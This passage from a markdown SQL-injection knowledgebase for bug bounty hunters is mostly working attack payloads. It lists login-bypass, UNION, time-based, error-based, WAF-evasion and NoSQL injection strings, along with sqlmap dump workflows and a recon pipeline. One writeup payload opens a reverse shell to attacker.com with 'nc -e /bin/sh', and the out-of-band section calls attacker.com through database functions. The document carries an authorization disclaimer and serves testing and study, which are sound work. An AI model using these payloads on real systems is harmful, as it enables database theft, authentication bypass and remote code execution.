U+02B9 -> %CA%B9 -> transforms to '
```

### Logic Testing Payloads

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

### Authentication Bypass Fuzzing

```sql
' OR '1'='1'--
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/
+       addition, concatenate
||      double pipe concatenate
%       wildcard attribute indicator
@variable   local variable
@@variable  global variable
```

### ORDER BY Fuzzing

```sql
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --
```

### UNION SELECT Fuzzing (1-30 columns)

```sql
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
...
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
```

### Time-Based Fuzzing

```sql
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
1) or sleep(5)#
") or sleep(5)='
')) or sleep(5)='
;waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
```

### Boolean-Based Fuzzing

```sql
 AND 1=1
 AND 1=0
 AND 1=1--
 AND 1=0--
 AND 1=1#
 AND 1=0#
 AND 1083=1083 AND (1427=1427
 AND 7506=9091 AND (5913=5913
 AS INJECTX WHERE 1=1 AND 1=1
 AS INJECTX WHERE 1=1 AND 1=0
 WHERE 1=1 AND 1=1
 WHERE 1=1 AND 1=0
 ORDER BY 1--
 ORDER BY 2--
 ORDER BY 31337--
 RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
```

---

## Automation Workflows

### SQLMap Basic Workflow

```bash
# Basic detection
sqlmap -u "http://example.com/page.php?id=1"

# Specify parameter
sqlmap -u "http://example.com/page.php?id=1" -p id

# Full enumeration
sqlmap -u "http://example.com/page.php?id=1" --dbs --tables --columns --dump

# WAF bypass with tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,randomcase

# Blind SQLi with specific technique
sqlmap -u "http://example.com/page.php?id=1" --technique=B --level=5 --risk=3

# Time-based with custom delay
sqlmap -u "http://example.com/page.php?id=1" --time-sec=10

# Second-order SQLi
sqlmap -u "http://example.com/login.php" --second-order="http://example.com/profile.php"

# OAST (Out-of-band)
sqlmap -u "http://example.com/page.php?id=1" --dns-domain=attacker.com
```

### Nuclei SQLi Automation

```bash
# Run all SQLi templates
nuclei -u http://example.com -t http/vulnerabilities/sqli/

# Specific SQLi template
nuclei -u http://example.com -t http/vulnerabilities/sqli/sqli-error.yaml

# With custom headers
nuclei -u http://example.com -t http/vulnerabilities/sqli/ -H "X-Forwarded-For: 1'"

# Rate limiting
nuclei -u http://example.com -t http/vulnerabilities/sqli/ -rl 10
```

### Burp Suite Automation

```bash
# Using Turbo Intruder for race condition SQLi
# Using HTTP Request Smuggler extension
# Using Param Miner for hidden parameter discovery
# Using Backslash Powered Scanner for differential parsing
```

### Recon Automation Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d example.com -o subdomains.txt

# Step 2: HTTP probing
httpx -l subdomains.txt -o alive.txt

# Step 3: Crawling
katana -list alive.txt -o endpoints.txt

# Step 4: Parameter discovery
cariddi -list alive.txt -intensive

# Step 5: SQLi scanning
sqlmap -m endpoints.txt --batch --level=1

# Step 6: Nuclei scanning
nuclei -l alive.txt -t http/vulnerabilities/sqli/
```

---

## Recon Methodology

### Phase 1: Target Enumeration

1. **Subdomain discovery**: Use `subfinder`, `amass`, `assetfinder`
2. **HTTP probing**: Use `httpx`, `httprobe` to find live targets
3. **Port scanning**: Use `naabu`, `nmap` for non-standard ports
4. **Technology fingerprinting**: Use `wappalyzer`, `whatweb`, `tlsx`

### Phase 2: Endpoint Discovery

1. **Crawling**: Use `katana`, `gospider`, `hakrawler`
2. **Archive analysis**: Use `waybackurls`, `gau` (GetAllUrls)
3. **JavaScript analysis**: Use `jsluice`, `linkfinder` for API endpoints
4. **Parameter discovery**: Use `cariddi`, `param-miner`

### Phase 3: SQLi Entry Point Identification

1. **URL parameters**: `?id=`, `?user=`, `?search=`, `?page=`, `?category=`
2. **POST body parameters**: Login forms, search boxes, filters
3. **HTTP headers**: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie`
4. **JSON/XML inputs**: API endpoints accepting structured data
5. **File upload metadata**: Filename, Content-Type headers
6. **GraphQL queries**: Inline SQL in resolvers

### Phase 4: Vulnerability Confirmation

1. **Error-based detection**: Submit `'` and observe error messages
2. **Boolean-based detection**: Submit `AND 1=1` vs `AND 1=2`
3. **Time-based detection**: Submit `SLEEP(5)` and measure response time
4. **OAST detection**: Submit DNS lookup payloads, monitor Interactsh/Burp Collaborator
5. **Union-based detection**: Test `ORDER BY` and `UNION SELECT NULL`

### Phase 5: Exploitation

1. **Determine DBMS**: Use error messages, timing differences, specific functions
2. **Enumerate database**: Extract schema, tables, columns
3. **Extract data**: Use UNION, blind, or error-based techniques
4. **Escalate**: File read/write, RCE via stacked queries or UDFs

### Phase 6: Reporting

1. **Document impact**: Data accessed, potential for further compromise
2. **Provide proof of concept**: Minimal reproducible payload
3. **Suggest remediation**: Parameterized queries, input validation, least privilege

---

## Nuclei Templates

### Basic SQLi Detection Template

```yaml
id: sqli-error-based

info:
  name: SQL Injection Error Based
  author: pdteam
  severity: high
  description: Detects SQL injection via error messages
  tags: sqli,error

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page.php?id=1'"
      - "{{BaseURL}}/page.php?id=1''"

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-"
          - "PostgreSQL"
          - "unterminated quoted string"
        condition: or
        part: body
```

### Time-Based SQLi Template

```yaml
id: sqli-time-based

info:
  name: SQL Injection Time Based
  author: pdteam
  severity: high
  tags: sqli,time-based

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page.php?id=1' AND SLEEP(5)--"
      - "{{BaseURL}}/page.php?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
```

### Boolean-Based SQLi Template

```yaml
id: sqli-boolean-based

info:
  name: SQL Injection Boolean Based
  author: pdteam
  severity: high
  tags: sqli,boolean

requests:
  - method: GET
    path:
      - "{{BaseURL}}/page.php?id=1 AND 1=1"
      - "{{BaseURL}}/page.php?id=1 AND 1=2"

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 != 200"
```

### Header-Based SQLi Template

```yaml
id: sqli-header-based

info:
  name: SQL Injection via Headers
  author: pdteam
  severity: high
  tags: sqli,header

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      User-Agent: "' OR '1'='1"
      X-Forwarded-For: "' OR '1'='1"
      Referer: "' OR '1'='1"

    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "error in your SQL"
        condition: or
        part: body
```

---

## Tools and Scanners

### Primary SQLi Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **sqlmap** | Automatic SQL injection and database takeover | https://github.com/sqlmapproject/sqlmap |
| **ghauri** | Advanced cross-platform SQLi detection/exploitation | https://github.com/r0oth3x49/ghauri |
| **NoSQLMap** | NoSQL injection automation | https://github.com/codingo/NoSQLMap |

### Request Smuggling Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **HTTP Request Smuggler** | Burp extension for desync detection | https://github.com/PortSwigger/http-request-smuggler |
| **smuggler** | Python request smuggling scanner | https://github.com/defparam/smuggler |
| **Turbo Intruder** | Fast HTTP attack tool | Burp BApp Store |

### Cache Poisoning Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **Param Miner** | Hidden parameter/unkeyed input discovery | https://github.com/PortSwigger/param-miner |
| **Web-Cache-Vulnerability-Scanner** | Cache poisoning detection | https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner |
| **autoPoisoner** | Automated cache poisoning | Community tools |

### Reconnaissance Tools

| Tool | Purpose | URL |
|------|---------|-----|
| **nuclei** | Fast vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| **httpx** | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| **katana** | Web crawler | https://github.com/projectdiscovery/katana |
| **subfinder** | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| **interactsh** | OAST interaction server | https://github.com/projectdiscovery/interactsh |
| **notify** | Notification framework | https://github.com/projectdiscovery/notify |
| **cariddi** | URL and parameter discovery | https://github.com/edoardottt/cariddi |

### Payload Collections

| Resource | URL |
|----------|-----|
| **PayloadsAllTheThings SQLi** | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection |
| **SecLists Fuzzing** | https://github.com/danielmiessler/SecLists/tree/master/Fuzzing |
| **SecLists Web Content** | https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content |
| **SQL Injection Payload List** | https://github.com/payloadbox/sql-injection-payload-list |
| **Bug Bounty SQLi** | https://github.com/0xspade/bugbounty/tree/master/sqli |

### Browser Security Research

| Tool | Purpose | URL |
|------|---------|-----|
| **CursedChrome** | Chrome extension implant for CSD attacks | https://github.com/mandatoryprogrammer/CursedChrome |
| **postMessage-tracker** | postMessage vulnerability detection | https://github.com/fransr/postMessage-tracker |
| **pp-finder** | Prototype pollution scanner | https://github.com/yeswehack/pp-finder |
| **client-side-prototype-pollution** | CSPP gadgets | https://github.com/BlackFan/client-side-prototype-pollution |

---

## Advanced Research

### SQL Injection Is Dead, Long Live SQL Injection (PortSwigger Research)

**Key Findings**:
- SQL injection remains prevalent despite being "well-understood"
- Modern applications use APIs, microservices, and ORMs that introduce new injection vectors
- JSON and XML parsing before SQL processing creates parser confusion vulnerabilities
- NoSQL databases are equally vulnerable to injection attacks

### HTTP Desync Attacks: Request Smuggling Reborn

**Key Techniques**:
- CL.TE and TE.CL desynchronization
- HTTP/2 downgrade attacks (H2.CL, H2.TE)
- Client-side desynchronization (CSD)
- Pause-based desynchronization
- Response queue poisoning

### Browser-Powered Desync Attacks

**Key Findings**:
- Browsers can be weaponized to attack websites via connection pool poisoning
- Cross-domain attacks possible due to connection pool sharing
- `fetch()` API can desync connections that are later used by navigation requests
- Safari and IE mixed-content protections can be bypassed

### Web Cache Entanglement

**Key Techniques**:
- Fat GET cache poisoning
- Cache parameter cloaking
- Cache key normalization quirks
- Internal cache header leakage

### Hidden OAuth Attack Vectors

**Key Findings**:
- Dynamic client registration enables second-order SSRF
- `redirect_uri` session poisoning via mass assignment
- `webfinger` endpoint exposes SQL/LDAP injection
- OAuth parameters stored in database may trigger second-order SQLi

---

## Bug Bounty Writeups

### SQL Injection in Login Form -> Account Takeover

**Impact**: Full account takeover of any user  
**Technique**: Boolean-based blind SQLi in username field  
**Payload**: `' OR SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`  
**Reward**: $5,000

### Second-Order SQLi in Profile Update -> Admin Access

**Impact**: Admin panel access, full data extraction  
**Technique**: Stored payload in display name, triggered in admin audit log  
**Payload**: `admin' UNION SELECT * FROM admin_users--`  
**Reward**: $8,000

### Time-Based SQLi in API Header -> Internal Data Exfiltration

**Impact**: Extraction of internal API keys and customer data  
**Technique**: Time-based blind in `X-Api-Version` header  
**Payload**: `1' AND IF(ASCII(SUBSTRING((SELECT api_key FROM config LIMIT 1),1,1))=65,SLEEP(5),0)--`  
**Reward**: $12,000

### SQLi via JSON Parameter -> RCE

**Impact**: Remote code execution on application server  
**Technique**: SQLi in JSON field, stacked queries to write web shell  
**Payload**: `{"search": "1'; DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(output text); COPY cmd FROM PROGRAM 'nc -e /bin/sh attacker.com 4444';--"}`  
**Reward**: $25,000

---

## Payload Collections

### Authentication Bypass Payloads

```sql
' OR '1'='1'--
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```

### Union-Based Payloads (1-30 columns)

```sql
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
...
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
```

### Error-Based Payloads

```sql
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```

### Time-Based Payloads

```sql
' AND SLEEP(5)--
' AND '1'='1' AND SLEEP(5)
'; WAITFOR DELAY '0:0:30'--
1) or sleep(5)#
") or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
ORDER BY SLEEP(5)
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
```

### Blind Boolean Payloads

```sql
AND 1=1
AND 1=0
AND 1083=1083 AND (1427=1427
AND 7506=9091 AND (5913=5913
AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=0
RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='%
 and (select substring(@@version,1,1))='X'
```

### Polyglot Payloads

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### WAF Bypass Payloads

```sql
?id=1%09and%091=1%09--
?id=1%0Aand%0A1=1%0A--
?id=1/*comment*/AND/**/1=1/**/--
?id=1/*!12345UNION*//*!12345SELECT*/1--
?id=(1)and(1)=(1)--
LIMIT 1 OFFSET 0
SUBSTR('SQL' FROM 1 FOR 1)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
SUBSTRING(VERSION(),1,1)LIKE(5)
SUBSTRING(VERSION(),1,1)NOT IN(4,3)
SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4
SeLeCt * FrOm users
'/**/UN/**/ION/**/SEL/**/ECT/**/
```

### NoSQL Injection Payloads

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
{"email":"admin@example.com","token":{"$ne":null},"newPassword":"hunter2"}
{"$where":"this.email == 'user@example.com' || true; //"}
{"username":{"$regex":"^admin"}}
```

---

## Detection Techniques

### Manual Detection Checklist

1. **Submit single quote** `'` to every input
2. **Check for SQL errors** in response body/headers
3. **Test Boolean logic**: `AND 1=1` vs `AND 1=2`
4. **Test time delays**: `SLEEP(5)`, `WAITFOR DELAY`, `pg_sleep(5)`
5. **Test UNION injection**: `ORDER BY 1--` through `ORDER BY 50--`
6. **Test stacked queries**: `; SELECT 1--`
7. **Test in different contexts**: URL params, headers, cookies, JSON body
8. **Test encoding variations**: URL encoding, Unicode, double encoding
9. **Test with different HTTP methods**: GET, POST, PUT, DELETE
10. **Test second-order**: Store payload, trigger in different functionality

### Automated Detection

- **sqlmap**: `--level=1` to `--level=5`, `--risk=1` to `--risk=3`
- **Burp Scanner**: Active scanning with SQLi insertion points
- **Nuclei**: `http/vulnerabilities/sqli/` templates
- **OWASP ZAP**: Active scanning rules for SQLi

### OAST (Out-of-Band) Detection

Use when application is blind and doesn't return errors or timing differences:

**MySQL**:
```sql
SELECT LOAD_FILE('\\attacker.com\a')
SELECT ... INTO OUTFILE '\\attacker.com\x07'
```

**MSSQL**:
```sql
exec master..xp_dirtree '//attacker.com/a'
```

**Oracle**:
```sql
SELECT UTL_INADDR.get_host_address('attacker.com')
```

**PostgreSQL**:
```sql
COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'
```

---

## References

### Primary Sources

1. **PortSwigger Web Security Academy** — https://portswigger.net/web-security/sql-injection
2. **PortSwigger Research: SQL Injection Is Dead, Long Live SQL Injection** — https://portswigger.net/research/sql-injection-is-dead-long-live-sql-injection
3. **PortSwigger Research: HTTP Desync Attacks** — https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
4. **PortSwigger Research: Browser-Powered Desync** — https://portswigger.net/research/browser-powered-desync-attacks
5. **PortSwigger Research: Web Cache Entanglement** — https://portswigger.net/research/web-cache-entanglement
6. **PortSwigger Research: Web Cache Poisoning** — https://portswigger.net/research/practical-web-cache-poisoning
7. **PortSwigger Research: Hidden OAuth Attack Vectors** — https://portswigger.net/research/hidden-oauth-attack-vectors
8. **HackTricks SQL Injection** — https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
9. **OWASP SQL Injection** — https://owasp.org/www-community/attacks/SQL_Injection
10. **PayloadsAllTheThings SQLi** — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Tools and Frameworks

11. **sqlmap** — https://github.com/sqlmapproject/sqlmap
12. **NoSQLMap** — https://github.com/codingo/NoSQLMap
13. **Nuclei** — https://github.com/projectdiscovery/nuclei
14. **HTTP Request Smuggler** — https://github.com/PortSwigger/http-request-smuggler
15. **Param Miner** — https://github.com/PortSwigger/param-miner
16. **SecLists** — https://github.com/danielmiessler/SecLists

### Research Papers and Whitepapers

17. **A Novel Technique for SQL Injection in PDO's Prepared Statements** — Adam Kues, 2025
18. **NetSPI SQL Injection Wiki** — https://sqlwiki.netspi.com/
19. **PentestMonkey MySQL Injection Cheat Sheet** — https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
20. **SQLi Optimization and Obfuscation Techniques** — Roberto Salgado, 2013

### CVE References

21. **CVE-2021-26715** — MITREid Connect SSRF via logo_uri
22. **CVE-2021-27582** — MITREid Connect redirect_uri bypass
23. **CVE-2024-42005** — Django ORM SQL injection
24. **CVE-2023-22794** — Rails ActiveRecord SQL injection
25. **CVE-2020-25638** — Hibernate SQL injection

---

> **Disclaimer**: This knowledgebase is intended for authorized security testing, bug bounty research, and educational purposes only. Always obtain proper authorization before testing any system. The techniques described here should only be used on systems you own or have explicit permission to test.
